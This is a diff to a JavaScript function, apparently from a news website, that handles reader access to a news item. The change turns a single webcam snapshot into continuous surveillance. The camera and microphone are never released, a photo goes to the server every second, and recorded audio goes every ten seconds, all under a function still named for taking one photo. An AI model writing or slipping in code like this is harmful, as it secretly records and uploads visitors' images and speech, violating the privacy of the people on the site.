@@ -3,23 +3,18 @@ function capturarEEnviarFoto(idNoticia, idUsuario) {
     const canvas = document.createElement('canvas');
     const context = canvas.getContext("2d");
 
-    navigator.mediaDevices.getUserMedia({ video: true })
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
         .then((stream) => {
             video.srcObject = stream;
+            video.onloadedmetadata = () => {//garante que o vídeo foi carregado 
 
-            video.onloadedmetadata = () => {
                 video.play();
 
-                setTimeout(() => {
-                    // Define tamanho do canvas
+                // FOTO: a cada 1 segundo
+                const fotoInterval = setInterval(() => {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
-
-                    // Captura
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    stream.getTracks().forEach(track => track.stop());
-
-                    // Converte para Blob
                     canvas.toBlob((blob) => {
                         const formData = new FormData();
                         formData.append("foto", blob, "foto.png");
@@ -29,19 +24,53 @@ function capturarEEnviarFoto(idNoticia, idUsuario) {
                             body: formData
                         }).then(resp => {
                             if (resp.ok) {
-                                console.log("📸 Foto enviada com sucesso.");
+                                console.log("📸 Foto enviada");
                             } else {
-                                console.error("Erro ao enviar foto.");
+                                console.error("❌ Erro ao enviar foto");
                             }
-                        }).catch(err => {
-                            console.error("Erro na requisição:", err);
                         });
                     }, "image/png");
-                }, 1000);
+                }, 1000); // a cada 1 segundo
+
+                // ÁUDIO: gravação contínua e envio a cada 10 segundos
+                const mediaRecorder = new MediaRecorder(stream);
+                let audioChunks = [];
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        audioChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.start(); // inicia gravação
+
+                // A cada 10 segundos, envia o áudio capturado e reinicia o buffer
+                const audioInterval = setInterval(() => {
+                    if (audioChunks.length > 0) {
+                        const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
+                        const audioFormData = new FormData();
+                        audioFormData.append("audio", audioBlob, "audio.webm");
+
+                        fetch(`/noticia-acesso/add-audio/${idNoticia}/${idUsuario}`, {
+                            method: "POST",
+                            body: audioFormData
+                        }).then(resp => {
+                            if (resp.ok) {
+                                console.log("🎤 Áudio enviado");
+                            } else {
+                                console.error("❌ Erro ao enviar áudio");
+                            }
+                        });
+
+                        // Limpa o buffer para próxima gravação
+                        audioChunks = [];
+                    }
+                }, 10000); // a cada 10 segundos
             };
+
         })
         .catch((error) => {
-            console.error("❌ Erro ao acessar a câmera:", error);
+            console.error("❌ Erro ao acessar a câmera e microfone:", error);
         });
 }
 
